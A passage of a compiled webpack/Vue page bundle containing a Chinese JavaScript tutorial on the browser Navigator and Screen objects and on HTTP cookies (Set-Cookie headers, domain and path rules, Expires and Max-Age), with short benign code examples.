(window.webpackJsonp=window.webpackJsonp||[]).push([[219],{655:function(e,t,a){"use strict";a.r(t);var o=a(25),v=Object(o.a)({},(function(){var e=this,t=e.$createElement,a=e._self._c||t;return a("ContentSlotsDistributor",{attrs:{"slot-key":e.$parent.slotKey}},[a("h1",{attrs:{id:"浏览器模型"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#浏览器模型"}},[e._v("#")]),e._v(" 浏览器模型")]),e._v(" "),a("h2",{attrs:{id:"navigator对象-screen对象"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#navigator对象-screen对象"}},[e._v("#")]),e._v(" Navigator对象，Screen对象")]),e._v(" "),a("p",[a("code",[e._v("window.navigator")]),e._v("属性指向一个包含浏览器和系统信息的 Navigator 对象。脚本通过这个属性了解用户的环境信息。")]),e._v(" "),a("h5",{attrs:{id:""}},[a("a",{staticClass:"header-anchor",attrs:{href:"#"}},[e._v("#")])]),e._v(" "),a("h3",{attrs:{id:"navigator-对象的属性"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#navigator-对象的属性"}},[e._v("#")]),e._v(" Navigator 对象的属性")]),e._v(" "),a("h4",{attrs:{id:"navigator-useragent"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#navigator-useragent"}},[e._v("#")]),e._v(" Navigator.userAgent")]),e._v(" "),a("p",[a("code",[e._v("navigator.userAgent")]),e._v("属性返回浏览器的 User Agent 字符串，表示用户设备信息，包含了浏览器的厂商、版本、操作系统等信息。")]),e._v(" "),a("p",[e._v("下面是 Chrome 浏览器的"),a("code",[e._v("userAgent")]),e._v("。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v('navigator.userAgent\n// "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36"\n')])])]),a("p",[e._v("通过"),a("code",[e._v("userAgent")]),e._v("属性识别浏览器，不是一个好办法。因为必须考虑所有的情况（不同的浏览器，不同的版本），非常麻烦，而且用户可以改变这个字符串。这个字符串的格式并无统一规定，也无法保证未来的适用性，各种上网设备层出不穷，难以穷尽。所以，现在一般不再通过它识别浏览器了，而是使用“功能识别”方法，即逐一测试当前浏览器是否支持要用到的 JavaScript 功能。")]),e._v(" "),a("p",[e._v("不过，通过"),a("code",[e._v("userAgent")]),e._v("可以大致准确地识别手机浏览器，方法就是测试是否包含"),a("code",[e._v("mobi")]),e._v("字符串。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("var ua = navigator.userAgent.toLowerCase();\n\nif (/mobi/.test(ua)) {\n  // 手机浏览器\n} else {\n  // 非手机浏览器\n}\n")])])]),a("p",[e._v("如果想要识别所有移动设备的浏览器，可以测试更多的特征字符串。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("/mobi|android|touch|mini/.test(ua)\n")])])]),a("h4",{attrs:{id:"navigator-plugins"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#navigator-plugins"}},[e._v("#")]),e._v(" Navigator.plugins")]),e._v(" "),a("p",[a("code",[e._v("Navigator.plugins")]),e._v("属性返回一个类似数组的对象，成员是 Plugin 实例对象，表示浏览器安装的插件，比如 Flash、ActiveX 等。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("var pluginsLength = navigator.plugins.length;\n\nfor (var i = 0; i < pluginsLength; i++) {\n  console.log(navigator.plugins[i].name);\n  console.log(navigator.plugins[i].filename);\n  console.log(navigator.plugins[i].description);\n  console.log(navigator.plugins[i].version);\n}\n")])])]),a("h4",{attrs:{id:"navigator-platform"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#navigator-platform"}},[e._v("#")]),e._v(" Navigator.platform")]),e._v(" "),a("p",[a("code",[e._v("Navigator.platform")]),e._v("属性返回用户的操作系统信息，比如"),a("code",[e._v("MacIntel")]),e._v("、"),a("code",[e._v("Win32")]),e._v("、"),a("code",[e._v("Linux x86_64")]),e._v("等 。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v('navigator.platform\n// "Linux x86_64"\n')])])]),a("h4",{attrs:{id:"navigator-online"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#navigator-online"}},[e._v("#")]),e._v(" Navigator.onLine")]),e._v(" "),a("p",[a("code",[e._v("navigator.onLine")]),e._v("属性返回一个布尔值，表示用户当前在线还是离线（浏览器断线）。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("navigator.onLine // true\n")])])]),a("p",[e._v("有时，浏览器可以连接局域网，但是局域网不能连通外网。这时，有的浏览器的"),a("code",[e._v("onLine")]),e._v("属性会返回"),a("code",[e._v("true")]),e._v("，所以不能假定只要是"),a("code",[e._v("true")]),e._v("，用户就一定能访问互联网。不过，如果是"),a("code",[e._v("false")]),e._v("，可以断定用户一定离线。")]),e._v(" "),a("p",[e._v("用户变成在线会触发"),a("code",[e._v("online")]),e._v("事件，变成离线会触发"),a("code",[e._v("offline")]),e._v("事件，可以通过"),a("code",[e._v("window.ononline")]),e._v("和"),a("code",[e._v("window.onoffline")]),e._v("指定这两个事件的回调函数。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("window.addEventListener('offline', function(e) { console.log('offline'); });\nwindow.addEventListener('online', function(e) { console.log('online'); });\n")])])]),a("h4",{attrs:{id:"navigator-language-navigator-languages"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#navigator-language-navigator-languages"}},[e._v("#")]),e._v(" Navigator.language，Navigator.languages")]),e._v(" "),a("p",[a("code",[e._v("Navigator.language")]),e._v("属性返回一个字符串，表示浏览器的首选语言。该属性只读。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v('navigator.language // "en"\n')])])]),a("p",[a("code",[e._v("Navigator.languages")]),e._v("属性返回一个数组，表示用户可以接受的语言。"),a("code",[e._v("Navigator.language")]),e._v("总是这个数组的第一个成员。HTTP 请求头信息的"),a("code",[e._v("Accept-Language")]),e._v("字段，就来自这个数组。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v('navigator.languages  // ["en-US", "en", "zh-CN", "zh", "zh-TW"]\n')])])]),a("p",[e._v("如果这个属性发生变化，就会在"),a("code",[e._v("window")]),e._v("对象上触发"),a("code",[e._v("languagechange")]),e._v("事件。")]),e._v(" "),a("h4",{attrs:{id:"navigator-geolocation"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#navigator-geolocation"}},[e._v("#")]),e._v(" Navigator.geolocation")]),e._v(" "),a("p",[a("code",[e._v("Navigator.geolocation")]),e._v("属性返回一个 Geolocation 对象，包含用户地理位置的信息。注意，该 API 只有在 HTTPS 协议下可用，否则调用下面方法时会报错。")]),e._v(" "),a("p",[e._v("Geolocation 对象提供下面三个方法。")]),e._v(" "),a("ul",[a("li",[e._v("Geolocation.getCurrentPosition()：得到用户的当前位置")]),e._v(" "),a("li",[e._v("Geolocation.watchPosition()：监听用户位置变化")]),e._v(" "),a("li",[e._v("Geolocation.clearWatch()：取消"),a("code",[e._v("watchPosition()")]),e._v("方法指定的监听函数")])]),e._v(" "),a("p",[e._v("注意，调用这三个方法时，浏览器会跳出一个对话框，要求用户给予授权。")]),e._v(" "),a("h4",{attrs:{id:"navigator-cookieenabled"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#navigator-cookieenabled"}},[e._v("#")]),e._v(" Navigator.cookieEnabled")]),e._v(" "),a("p",[a("code",[e._v("navigator.cookieEnabled")]),e._v("属性返回一个布尔值，表示浏览器的 Cookie 功能是否打开。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("navigator.cookieEnabled // true\n")])])]),a("p",[e._v("注意，这个属性反映的是浏览器总的特性，与是否储存某个具体的网站的 Cookie 无关。用户可以设置某个网站不得储存 Cookie，这时"),a("code",[e._v("cookieEnabled")]),e._v("返回的还是"),a("code",[e._v("true")]),e._v("。")]),e._v(" "),a("h3",{attrs:{id:"navigator-对象的方法"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#navigator-对象的方法"}},[e._v("#")]),e._v(" Navigator 对象的方法")]),e._v(" "),a("h4",{attrs:{id:"navigator-javaenabled"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#navigator-javaenabled"}},[e._v("#")]),e._v(" Navigator.javaEnabled()")]),e._v(" "),a("p",[a("code",[e._v("navigator.javaEnabled()")]),e._v("方法返回一个布尔值，表示浏览器是否能运行 Java Applet 小程序。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("navigator.javaEnabled() // false\n")])])]),a("h4",{attrs:{id:"navigator-sendbeacon"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#navigator-sendbeacon"}},[e._v("#")]),e._v(" Navigator.sendBeacon()")]),e._v(" "),a("p",[a("code",[e._v("Navigator.sendBeacon()")]),e._v("方法用于向服务器异步发送数据，详见《XMLHttpRequest 对象》一章。")]),e._v(" "),a("h3",{attrs:{id:"navigator-的实验性属性"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#navigator-的实验性属性"}},[e._v("#")]),e._v(" Navigator 的实验性属性")]),e._v(" "),a("p",[e._v("Navigator 对象有一些实验性属性，在部分浏览器可用。")]),e._v(" "),a("h4",{attrs:{id:"navigator-devicememory"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#navigator-devicememory"}},[e._v("#")]),e._v(" Navigator.deviceMemory")]),e._v(" "),a("p",[a("code",[e._v("navigator.deviceMemory")]),e._v("属性返回当前计算机的内存数量（单位为 GB）。该属性只读，只在 HTTPS 环境下可用。")]),e._v(" "),a("p",[e._v("它的返回值是一个近似值，四舍五入到最接近的2的幂，通常是 0.25、0.5、1、2、4、8。实际内存超过 8GB，也返回"),a("code",[e._v("8")]),e._v("。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("if (navigator.deviceMemory > 1) {\n  await import('./costly-module.js');\n}\n")])])]),a("p",[e._v("上面示例中，只有当前内存大于 1GB，才加载大型的脚本。")]),e._v(" "),a("h4",{attrs:{id:"navigator-hardwareconcurrency"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#navigator-hardwareconcurrency"}},[e._v("#")]),e._v(" Navigator.hardwareConcurrency")]),e._v(" "),a("p",[a("code",[e._v("navigator.hardwareConcurrency")]),e._v("属性返回用户计算机上可用的逻辑处理器的数量。该属性只读。")]),e._v(" "),a("p",[e._v("现代计算机的 CPU 有多个物理核心，每个物理核心有时支持一次运行多个线程。因此，四核 CPU 可以提供八个逻辑处理器核心。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("if (navigator.hardwareConcurrency > 4) {\n  await import('./costly-module.js');\n}\n")])])]),a("p",[e._v("上面示例中，可用的逻辑处理器大于4，才会加载大型脚本。")]),e._v(" "),a("p",[e._v("该属性通过用于创建 Web Worker，每个可用的逻辑处理器都创建一个 Worker。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("let workerList = [];\n\nfor (let i = 0; i < window.navigator.hardwareConcurrency; i++) {\n  let newWorker = {\n    worker: new Worker('cpuworker.js'),\n    inUse: false\n  };\n  workerList.push(newWorker);\n}\n")])])]),a("p",[e._v("上面示例中，有多少个可用的逻辑处理器，就创建多少个 Web Worker。")]),e._v(" "),a("h4",{attrs:{id:"navigator-connection"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#navigator-connection"}},[e._v("#")]),e._v(" Navigator.connection")]),e._v(" "),a("p",[a("code",[e._v("navigator.connection")]),e._v("属性返回一个对象，包含当前网络连接的相关信息。")]),e._v(" "),a("ul",[a("li",[e._v("downlink：有效带宽估计值（单位：兆比特/秒，Mbps），四舍五入到每秒 25KB 的最接近倍数。")]),e._v(" "),a("li",[e._v("downlinkMax：当前连接的最大下行链路速度（单位：兆比特每秒，Mbps）。")]),e._v(" "),a("li",[e._v("effectiveType：返回连接的等效类型，可能的值为"),a("code",[e._v("slow-2g")]),e._v("、"),a("code",[e._v("2g")]),e._v("、"),a("code",[e._v("3g")]),e._v("、"),a("code",[e._v("4g")]),e._v("。")]),e._v(" "),a("li",[e._v("rtt：当前连接的估计有效往返时间，四舍五入到最接近的25毫秒的倍数。")]),e._v(" "),a("li",[e._v("saveData：用户是否设置了浏览器的减少数据使用量选项（比如不加载图片），返回"),a("code",[e._v("true")]),e._v("或者"),a("code",[e._v("false")]),e._v("。")]),e._v(" "),a("li",[e._v("type：当前连接的介质类型，可能的值为"),a("code",[e._v("bluetooth")]),e._v("、"),a("code",[e._v("cellular")]),e._v("、"),a("code",[e._v("ethernet")]),e._v("、"),a("code",[e._v("none")]),e._v("、"),a("code",[e._v("wifi")]),e._v("、"),a("code",[e._v("wimax")]),e._v("、"),a("code",[e._v("other")]),e._v("、"),a("code",[e._v("unknown")]),e._v("。")])]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("if (navigator.connection.effectiveType === '4g') {\n  await import('./costly-module.js');\n}\n")])])]),a("p",[e._v("上面示例中，如果网络连接是 4G，则加载大型脚本。")]),e._v(" "),a("h3",{attrs:{id:"screen-对象"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#screen-对象"}},[e._v("#")]),e._v(" Screen 对象")]),e._v(" "),a("p",[e._v("Screen 对象表示当前窗口所在的屏幕，提供显示设备的信息。"),a("code",[e._v("window.screen")]),e._v("属性指向这个对象。")]),e._v(" "),a("p",[e._v("该对象有下面的属性。")]),e._v(" "),a("ul",[a("li",[a("code",[e._v("Screen.height")]),e._v("：浏览器窗口所在的屏幕的高度（单位像素）。除非调整显示器的分辨率，否则这个值可以看作常量，不会发生变化。显示器的分辨率与浏览器设置无关，缩放网页并不会改变分辨率。")]),e._v(" "),a("li",[a("code",[e._v("Screen.width")]),e._v("：浏览器窗口所在的屏幕的宽度（单位像素）。")]),e._v(" "),a("li",[a("code",[e._v("Screen.availHeight")]),e._v("：浏览器窗口可用的屏幕高度（单位像素）。因为部分空间可能不可用，比如系统的任务栏或者 Mac 系统屏幕底部的 Dock 区，这个属性等于"),a("code",[e._v("height")]),e._v("减去那些被系统组件的高度。")]),e._v(" "),a("li",[a("code",[e._v("Screen.availWidth")]),e._v("：浏览器窗口可用的屏幕宽度（单位像素）。")]),e._v(" "),a("li",[a("code",[e._v("Screen.pixelDepth")]),e._v("：整数，表示屏幕的色彩位数，比如"),a("code",[e._v("24")]),e._v("表示屏幕提供24位色彩。")]),e._v(" "),a("li",[a("code",[e._v("Screen.colorDepth")]),e._v("："),a("code",[e._v("Screen.pixelDepth")]),e._v("的别名。严格地说，colorDepth 表示应用程序的颜色深度，pixelDepth 表示屏幕的颜色深度，绝大多数情况下，它们都是同一件事。")]),e._v(" "),a("li",[a("code",[e._v("Screen.orientation")]),e._v("：返回一个对象，表示屏幕的方向。该对象的"),a("code",[e._v("type")]),e._v("属性是一个字符串，表示屏幕的具体方向，"),a("code",[e._v("landscape-primary")]),e._v("表示横放，"),a("code",[e._v("landscape-secondary")]),e._v("表示颠倒的横放，"),a("code",[e._v("portrait-primary")]),e._v("表示竖放，"),a("code",[e._v("portrait-secondary")]),e._v("表示颠倒的竖放。")])]),e._v(" "),a("p",[e._v("下面是"),a("code",[e._v("Screen.orientation")]),e._v("的例子。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v('window.screen.orientation\n// { angle: 0, type: "landscape-primary", onchange: null }\n')])])]),a("p",[e._v("下面的例子保证屏幕分辨率大于 1024 x 768。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("if (window.screen.width >= 1024 && window.screen.height >= 768) {\n  // 分辨率不低于 1024x768\n}\n")])])]),a("p",[e._v("下面是根据屏幕的宽度，将用户导向不同网页的代码。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("if ((screen.width <= 800) && (screen.height <= 600)) {\n  window.location.replace('small.html');\n} else {\n  window.location.replace('wide.html');\n}\n")])])]),a("h3",{attrs:{id:"cookie"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#cookie"}},[e._v("#")]),e._v(" Cookie")]),e._v(" "),a("h3",{attrs:{id:"概述"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#概述"}},[e._v("#")]),e._v(" 概述")]),e._v(" "),a("p",[e._v("Cookie 是服务器保存在浏览器的一小段文本信息，一般大小不能超过4KB。浏览器每次向服务器发出请求，就会自动附上这段信息。")]),e._v(" "),a("p",[e._v("HTTP 协议不带有状态，有些请求需要区分状态，就通过 Cookie 附带字符串，让服务器返回不一样的回应。举例来说，用户登录以后，服务器往往会在网站上留下一个 Cookie，记录用户编号（比如"),a("code",[e._v("id=1234")]),e._v("），以后每次浏览器向服务器请求数据，就会带上这个字符串，服务器从而知道是谁在请求，应该回应什么内容。")]),e._v(" "),a("p",[e._v("Cookie 的目的就是区分用户，以及放置状态信息，它的使用场景主要如下。")]),e._v(" "),a("ul",[a("li",[e._v("对话（session）管理：保存登录状态、购物车等需要记录的信息。")]),e._v(" "),a("li",[e._v("个性化信息：保存用户的偏好，比如网页的字体大小、背景色等等。")]),e._v(" "),a("li",[e._v("追踪用户：记录和分析用户行为。")])]),e._v(" "),a("p",[e._v("Cookie 不是一种理想的客户端存储机制。它的容量很小（4KB），缺乏数据操作接口，而且会影响性能。客户端存储建议使用 Web storage API 和 IndexedDB。只有那些每次请求都需要让服务器知道的信息，才应该放在 Cookie 里面。")]),e._v(" "),a("p",[e._v("每个 Cookie 都有以下几方面的元数据。")]),e._v(" "),a("ul",[a("li",[e._v("Cookie 的名字")]),e._v(" "),a("li",[e._v("Cookie 的值（真正的数据写在这里面）")]),e._v(" "),a("li",[e._v("到期时间（超过这个时间会失效）")]),e._v(" "),a("li",[e._v("所属域名（默认为当前域名）")]),e._v(" "),a("li",[e._v("生效的路径（默认为当前网址）")])]),e._v(" "),a("p",[e._v("举例来说，用户访问网址"),a("code",[e._v("www.example.com")]),e._v("，服务器在浏览器写入一个 Cookie。这个 Cookie 的所属域名为"),a("code",[e._v("www.example.com")]),e._v("，生效路径为根路径"),a("code",[e._v("/")]),e._v("。")]),e._v(" "),a("p",[e._v("如果 Cookie 的生效路径设为"),a("code",[e._v("/forums")]),e._v("，那么这个 Cookie 只有在访问"),a("code",[e._v("www.example.com/forums")]),e._v("及其子路径时才有效。以后，浏览器访问某个路径之前，就会找出对该域名和路径有效，并且还没有到期的 Cookie，一起发送给服务器。")]),e._v(" "),a("p",[e._v("用户可以设置浏览器不接受 Cookie，也可以设置不向服务器发送 Cookie。"),a("code",[e._v("window.navigator.cookieEnabled")]),e._v("属性返回一个布尔值，表示浏览器是否打开 Cookie 功能。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("window.navigator.cookieEnabled // true\n")])])]),a("p",[a("code",[e._v("document.cookie")]),e._v("属性返回当前网页的 Cookie。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v('document.cookie // "id=foo;key=bar"\n')])])]),a("p",[e._v("不同浏览器对 Cookie 数量和大小的限制，是不一样的。一般来说，单个域名设置的 Cookie 不应超过30个，每个 Cookie 的大小不能超过 4KB。超过限制以后，Cookie 将被忽略，不会被设置。")]),e._v(" "),a("p",[e._v("Cookie 是按照域名区分的，"),a("code",[e._v("foo.com")]),e._v("只能读取自己放置的 Cookie，无法读取其他网站（比如"),a("code",[e._v("bar.com")]),e._v("）放置的 Cookie。一般情况下，一级域名也不能读取二级域名留下的 Cookie，比如"),a("code",[e._v("mydomain.com")]),e._v("不能读取"),a("code",[e._v("subdomain.mydomain.com")]),e._v("设置的 Cookie。但是有一个例外，设置 Cookie 的时候（不管是一级域名设置的，还是二级域名设置的），明确将"),a("code",[e._v("domain")]),e._v("属性设为一级域名，则这个域名下面的各级域名可以共享这个 Cookie。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("Set-Cookie: name=value; domain=mydomain.com\n")])])]),a("p",[e._v("上面示例中，设置 Cookie 时，"),a("code",[e._v("domain")]),e._v("属性设为"),a("code",[e._v("mydomain.com")]),e._v("，那么各级的子域名和一级域名都可以读取这个 Cookie。")]),e._v(" "),a("p",[e._v("注意，区分 Cookie 时不考虑协议和端口。也就是说，"),a("code",[e._v("http://example.com")]),e._v("设置的 Cookie，可以被"),a("code",[e._v("https://example.com")]),e._v("或"),a("code",[e._v("http://example.com:8080")]),e._v("读取。")]),e._v(" "),a("h3",{attrs:{id:"cookie-与-http-协议"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#cookie-与-http-协议"}},[e._v("#")]),e._v(" Cookie 与 HTTP 协议")]),e._v(" "),a("p",[e._v("Cookie 由 HTTP 协议生成，也主要是供 HTTP 协议使用。")]),e._v(" "),a("h4",{attrs:{id:"http-回应-cookie-的生成"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#http-回应-cookie-的生成"}},[e._v("#")]),e._v(" HTTP 回应：Cookie 的生成")]),e._v(" "),a("p",[e._v("服务器如果希望在浏览器保存 Cookie，就要在 HTTP 回应的头信息里面，放置一个"),a("code",[e._v("Set-Cookie")]),e._v("字段。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("Set-Cookie:foo=bar\n")])])]),a("p",[e._v("上面代码会在浏览器保存一个名为"),a("code",[e._v("foo")]),e._v("的 Cookie，它的值为"),a("code",[e._v("bar")]),e._v("。")]),e._v(" "),a("p",[e._v("HTTP 回应可以包含多个"),a("code",[e._v("Set-Cookie")]),e._v("字段，即在浏览器生成多个 Cookie。下面是一个例子。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("HTTP/1.0 200 OK\nContent-type: text/html\nSet-Cookie: yummy_cookie=choco\nSet-Cookie: tasty_cookie=strawberry\n\n[page content]\n")])])]),a("p",[e._v("除了 Cookie 的值，"),a("code",[e._v("Set-Cookie")]),e._v("字段还可以附加 Cookie 的属性。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("Set-Cookie: <cookie-name>=<cookie-value>; Expires=<date>\nSet-Cookie: <cookie-name>=<cookie-value>; Max-Age=<non-zero-digit>\nSet-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>\nSet-Cookie: <cookie-name>=<cookie-value>; Path=<path-value>\nSet-Cookie: <cookie-name>=<cookie-value>; Secure\nSet-Cookie: <cookie-name>=<cookie-value>; HttpOnly\n")])])]),a("p",[e._v("上面的几个属性的含义，将在后文解释。")]),e._v(" "),a("p",[e._v("一个"),a("code",[e._v("Set-Cookie")]),e._v("字段里面，可以同时包括多个属性，没有次序的要求。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>; Secure; HttpOnly\n")])])]),a("p",[e._v("下面是一个例子。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly\n")])])]),a("p",[e._v("如果服务器想改变一个早先设置的 Cookie，必须同时满足四个条件：Cookie 的"),a("code",[e._v("key")]),e._v("、"),a("code",[e._v("domain")]),e._v("、"),a("code",[e._v("path")]),e._v("和"),a("code",[e._v("secure")]),e._v("都匹配。举例来说，如果原始的 Cookie 是用如下的"),a("code",[e._v("Set-Cookie")]),e._v("设置的。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("Set-Cookie: key1=value1; domain=example.com; path=/blog\n")])])]),a("p",[e._v("改变上面这个 Cookie 的值，就必须使用同样的"),a("code",[e._v("Set-Cookie")]),e._v("。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("Set-Cookie: key1=value2; domain=example.com; path=/blog\n")])])]),a("p",[e._v("只要有一个属性不同，就会生成一个全新的 Cookie，而不是替换掉原来那个 Cookie。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("Set-Cookie: key1=value2; domain=example.com; path=/\n")])])]),a("p",[e._v("上面的命令设置了一个全新的同名 Cookie，但是"),a("code",[e._v("path")]),e._v("属性不一样。下一次访问"),a("code",[e._v("example.com/blog")]),e._v("的时候，浏览器将向服务器发送两个同名的 Cookie。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("Cookie: key1=value1; key1=value2\n")])])]),a("p",[e._v("上面代码的两个 Cookie 是同名的，匹配越精确的 Cookie 排在越前面。")]),e._v(" "),a("h4",{attrs:{id:"http-请求-cookie-的发送"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#http-请求-cookie-的发送"}},[e._v("#")]),e._v(" HTTP 请求：Cookie 的发送")]),e._v(" "),a("p",[e._v("浏览器向服务器发送 HTTP 请求时，每个请求都会带上相应的 Cookie。也就是说，把服务器早前保存在浏览器的这段信息，再发回服务器。这时要使用 HTTP 头信息的"),a("code",[e._v("Cookie")]),e._v("字段。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("Cookie: foo=bar\n")])])]),a("p",[e._v("上面代码会向服务器发送名为"),a("code",[e._v("foo")]),e._v("的 Cookie，值为"),a("code",[e._v("bar")]),e._v("。")]),e._v(" "),a("p",[a("code",[e._v("Cookie")]),e._v("字段可以包含多个 Cookie，使用分号（"),a("code",[e._v(";")]),e._v("）分隔。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("Cookie: name=value; name2=value2; name3=value3\n")])])]),a("p",[e._v("下面是一个例子。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("GET /sample_page.html HTTP/1.1\nHost: www.example.org\nCookie: yummy_cookie=choco; tasty_cookie=strawberry\n")])])]),a("p",[e._v("服务器收到浏览器发来的 Cookie 时，有两点是无法知道的。")]),e._v(" "),a("ul",[a("li",[e._v("Cookie 的各种属性，比如何时过期。")]),e._v(" "),a("li",[e._v("哪个域名设置的 Cookie，到底是一级域名设的，还是某一个二级域名设的。")])]),e._v(" "),a("h3",{attrs:{id:"cookie-的属性"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#cookie-的属性"}},[e._v("#")]),e._v(" Cookie 的属性")]),e._v(" "),a("h4",{attrs:{id:"expires-max-age"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#expires-max-age"}},[e._v("#")]),e._v(" Expires，Max-Age")]),e._v(" "),a("p",[a("code",[e._v("Expires")]),e._v("属性指定一个具体的到期时间，到了指定时间以后，浏览器就不再保留这个 Cookie。它的值是 UTC 格式，可以使用"),a("code",[e._v("Date.prototype.toUTCString()")]),e._v("进行格式转换。")]),e._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;\n")])])]),a("p",[e._v("如果不设置该属性，或者设为"),a("code",[e._v("null")]),e._v("，Cookie 只在当前会话（session）有效，浏览器窗口一旦关闭，当前 Session 结束，该 Cookie 就会被删除。另外，浏览器根据本地时间，决定 Cookie 是否过期，由于本地时间是不精确的，所以没有办法保证 Cookie 一定会在服务器指定的时间过期。")]),e._v(" "),a("p",[a("code",[e._v("Max-Age")]),e._v("属性指定从现在开始 Cookie 存在的秒数，比如"),a("code",[e._v("60 * 60 * 24 * 365")]),e._v("（即一年）。过了这个时间以后，浏览器就不再保留这个 Cookie。")]),e._v(" "),a("p",[e._v("如果同时指定了"),a("code",[e._v("Expires")]),e._v("和"),a("code",[e._v("Max-Age")]),e._v("，那么"),a("code",[e._v("Max-Age")]),e._v("的值将优先生效。")]),e._v(" "),a("p",[e._v("如果"),a("code",[e._v("Set-Cookie")]),e._v("字段没有指定"),a("code",[e._v("Expires")]),e._v("或"),a("code",[e._v("Max-Age")]),e._v("属性，那么这个 Cookie 就是 Session Cookie，即它只在本次对话存在，一旦用户关闭浏览器，浏览器就不会再保留这个 Cookie。")]),e._v(" 